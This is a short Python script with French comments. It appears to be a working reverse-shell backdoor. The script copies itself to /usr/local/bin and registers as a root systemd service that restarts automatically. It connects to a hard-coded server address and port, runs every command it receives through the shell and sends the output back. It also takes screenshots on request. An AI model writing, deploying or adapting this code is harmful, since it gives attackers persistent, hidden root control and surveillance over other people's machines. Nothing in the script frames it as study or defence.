#!/usr/bin/env python3
import socket
import os
import subprocess
from PIL import ImageGrab

# Configuration du serveur
HOST = '192.168.137.7'  # Remplacez par l'adresse IP du serveur
PORT = 9999  # Remplacez par le port du serveur


def make_persistent():
    """
    Configure le script client pour qu'il s'exécute automatiquement en tant que service root au démarrage.
    """
    service_path = "/etc/systemd/system/client.service"
    persistent_path = "/usr/local/bin/client.py"

    try:
        # Copier le script actuel dans un emplacement persistant
        current_script = os.path.realpath(__file__)
        if not os.path.exists(persistent_path):
            os.system(f"cp {current_script} {persistent_path}")
            os.system(f"chmod +x {persistent_path}")
        
        # Créer un fichier de service systemd
        service_content = f"""
[Unit]
Description=Python Client Service
After=network.target

[Service]
ExecStart=/usr/bin/python3 {persistent_path}
Restart=always
User=root
WorkingDirectory=/usr/local/bin
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
"""
        # Écrire le fichier de service
        with open(service_path, "w") as service_file:
            service_file.write(service_content)

        # Configurer le service pour démarrer au boot
        os.system("systemctl daemon-reload")
        os.system("systemctl enable client.service")
        os.system("systemctl start client.service")
    except Exception as e:
        print(f"Erreur dans make_persistent : {e}")


def screenshot():
    """
    Capture une capture d'écran et la sauvegarde sous forme de fichier PNG.
    """
    try:
        screen = ImageGrab.grab()
        screen.save("screen.png")
    except Exception as e:
        pass


def connect_to_server():
    try:
        # Initialiser la connexion au serveur
        s = socket.socket()
        s.connect((HOST, PORT))

        while True:
            data = s.recv(1024)  # Taille du buffer

            if data[:2].decode("utf-8") == 'cd':
                os.chdir(data[3:].decode("utf-8"))

            if len(data) > 0:
                data = data.decode("utf-8")

                if data == 'screenshot':
                    screenshot()
                else:
                    # Exécution de la commande reçue
                    cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output_byte = cmd.stdout.read() + cmd.stderr.read()
                    output_str = str(output_byte, "utf-8")

                    s.send(str.encode(output_str + os.getcwd() + '> '))
    except Exception as e:
        pass
    finally:
        s.close()


if __name__ == "__main__":

    # Rendre le script persistant
    make_persistent()

    # Connecter au serveur et gérer les commandes
    connect_to_server()
